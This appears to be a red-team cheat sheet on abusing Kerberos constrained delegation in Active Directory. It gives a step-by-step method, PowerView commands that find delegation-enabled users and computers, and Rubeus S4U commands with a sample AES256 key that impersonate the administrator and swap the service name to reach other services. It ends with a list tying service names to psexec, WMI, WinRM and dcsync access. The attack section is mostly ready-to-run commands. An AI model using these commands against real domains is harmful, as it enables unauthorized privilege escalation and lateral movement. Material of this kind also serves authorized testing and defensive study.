#  Methodology
>1.  Enumerate users/computers which have constrained delegation enabled (Ignore domain controllers).
>2. Understand what you can acces if you compromise the user/machine by looking at `msDS-AllowedToDelegateTo`.
>3. Impersonate the user or have SYSTEM on the constrained delegation machine.
>4. Impersonate the high value target and abuse the lack of SPN validation.
---
# Powershell
>**ℹ️ Info:**
>
> Remember to follow the [PowerShell scripts methodology](../00%20-%20Miscellaneous/01-%20Methodology.md#PowerShell%20Scripts).

## PowerView
**Find objects with constrained delegation enabled:**
```powershell
# Users
Get-DomainUser –TrustedToAuth

# Computers
Get-DomainComputer –TrustedToAuth
```

---
# Binaries
>**ℹ️ Info:**
>
> Remember to follow the [binaries methodology](../00%20-%20Miscellaneous/01-%20Methodology.md#Binaries).

## Rubeus
**Use the S4U module to inject the ticket to the current session:**
```cmd
Rubeus.exe s4u /user:constrained_user /aes256:b4cb0430da8176ec6eae2002dfa86a8c6742e5a88448f1c2d6afc3781e114335 /impersonateuser:administrator /msdsspn:CIFS/usmssql.us.contoso.local /domain:us.contoso.local /ptt
```

**Abuse the lack of verification to query another SPN:**
```cmd
Rubeus.exe s4u /user:constrained_user /aes256:b4cb0430da8176ec6eae2002dfa86a8c6742e5a88448f1c2d6afc3781e114335 /impersonateuser:administrator /msdsspn:CIFS/usmssql.us.contoso.local /altservice:HTTP /domain:us.contoso.local /ptt
```
>**ℹ️ Info:**
> Different SPN and what they're used for:
>- CIFS for directory browsing, copying files.
>- HTTP for WinRS.
>- HOST and CIFS for psexec.
>- HOST and RPCSS for WMI.
>- HOST and HTTP for PowerShell Remoting/WINRM.
>- LDAP for dcsync.